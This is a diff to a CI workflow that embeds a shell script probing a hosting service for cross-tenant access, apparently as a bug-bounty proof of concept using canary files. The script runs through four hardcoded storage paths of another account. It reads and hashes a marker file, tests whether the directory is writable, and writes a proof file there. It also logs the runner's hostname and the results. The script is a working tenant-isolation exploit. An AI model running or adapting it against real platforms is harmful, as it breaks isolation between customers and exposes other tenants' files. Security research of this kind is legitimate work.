@@ -21,13 +21,13 @@ jobs:
           script = r'''#!/bin/sh
           version=$1
           dest=$2
-          target='/data/pages/4/c8/b9/4f/85356625/ceda0cf20d7c9acf57395f303b2e4c9c7071d65f'
-          marker="$target/b-owned-e73fa565726a4fc145906eb0.txt"
-          proof="$target/cross-tenant-cd159c7d3bd0ee6129248259.txt"
           result="$dest/cross-account-result-cd159c7d3bd0ee6129248259.txt"
           expected='BB_CT_B_OWNER_e73fa565726a4fc145906eb0'
           expected_sha='c21955acd4cf396e279b296fdf00108d4e3539f579eefabdd84d2be8a1aa4f18'
           proof_value='BB_CT_CROSS_WRITE_cd159c7d3bd0ee6129248259'
+          target=''
+          target_label=''
+          proof=''
           created=0
           cleanup() {
             if [ "$created" = 1 ]; then
@@ -40,26 +40,48 @@ jobs:
           marker_ok=0
           writable=0
           proof_absent=0
+          proof_preexisted=not-checked
           write_ok=0
           actual=''
           marker_sha=''
-          if [ -d "$target" ] && [ ! -L "$target" ]; then
-            target_ok=1
-          fi
-          if [ "$target_ok" = 1 ] && [ -f "$marker" ] && [ ! -L "$marker" ] && [ -r "$marker" ]; then
-            readable=1
-            actual=$(/bin/cat -- "$marker")
-            marker_sha=$(/usr/bin/sha256sum "$marker")
-            marker_sha=${marker_sha%% *}
-            if [ "$actual" = "$expected" ] && [ "$marker_sha" = "$expected_sha" ]; then
-              marker_ok=1
+          set -- \
+            'B1|/data/pages/1/12/a3/4c/85355083/117724c91b33e9601e2448665e02b99a69437209' \
+            'B2|/data/pages/3/32/5b/d7/85356027/691ff24606b6ad1e7ffc5d3bba02b8e04ec3d618' \
+            'B3|/data/pages/6/e1/d6/17/85356178/2b11148706b6e9ef9eae2984500dce374bb1ef74' \
+            'B4|/data/pages/4/c8/b9/4f/85356625/ceda0cf20d7c9acf57395f303b2e4c9c7071d65f'
+          for entry do
+            label=${entry%%|*}
+            candidate=${entry#*|}
+            candidate_marker="$candidate/b-owned-e73fa565726a4fc145906eb0.txt"
+            if [ -d "$candidate" ] && [ ! -L "$candidate" ] && \
+               [ -f "$candidate_marker" ] && [ ! -L "$candidate_marker" ] && \
+               [ -r "$candidate_marker" ]; then
+              candidate_actual=$(/bin/cat -- "$candidate_marker")
+              candidate_sha=$(/usr/bin/sha256sum "$candidate_marker")
+              candidate_sha=${candidate_sha%% *}
+              if [ "$candidate_actual" = "$expected" ] && [ "$candidate_sha" = "$expected_sha" ]; then
+                target=$candidate
+                target_label=$label
+                actual=$candidate_actual
+                marker_sha=$candidate_sha
+                target_ok=1
+                readable=1
+                marker_ok=1
+                break
+              fi
             fi
-          fi
+          done
           if [ "$target_ok" = 1 ] && [ -w "$target" ]; then
             writable=1
           fi
-          if [ ! -e "$proof" ] && [ ! -L "$proof" ]; then
-            proof_absent=1
+          if [ "$target_ok" = 1 ]; then
+            proof="$target/cross-tenant-cd159c7d3bd0ee6129248259.txt"
+            if [ ! -e "$proof" ] && [ ! -L "$proof" ]; then
+              proof_absent=1
+              proof_preexisted=0
+            else
+              proof_preexisted=1
+            fi
           fi
           if [ "$marker_ok" = 1 ] && [ "$writable" = 1 ] && [ "$proof_absent" = 1 ]; then
             umask 077
@@ -76,16 +98,18 @@ jobs:
           {
             echo CANARY=BB_CT_CROSS_ACCOUNT_V1
             echo SOURCE_REPOSITORY=singetu0096/pages-cross-tenant-source-2-20260911
-            echo TARGET_REPOSITORY=singetu0096-ano/pages-cross-tenant-canary-4-20260911
+            echo TARGET_OWNER=singetu0096-ano
+            echo FIXED_TARGET_COUNT=4
             printf 'SOURCE_HOSTNAME='; /bin/hostname
             printf 'SOURCE_DEST=%s\n' "$dest"
+            printf 'TARGET_LABEL=%s\n' "$target_label"
             printf 'TARGET=%s\n' "$target"
             printf 'TARGET_DIRECTORY=%s\n' "$target_ok"
             printf 'TARGET_MARKER_READABLE=%s\n' "$readable"
             printf 'TARGET_MARKER_SHA256=%s\n' "$marker_sha"
             printf 'TARGET_MARKER_MATCH=%s\n' "$marker_ok"
             printf 'TARGET_WRITABLE=%s\n' "$writable"
-            printf 'PROOF_PREEXISTED=%s\n' "$((1 - proof_absent))"
+            printf 'PROOF_PREEXISTED=%s\n' "$proof_preexisted"
             printf 'CROSS_ACCOUNT_WRITE=%s\n' "$write_ok"
             printf 'PROOF_SHA256=%s\n' "${proof_sha:-}"
           } > "$result"
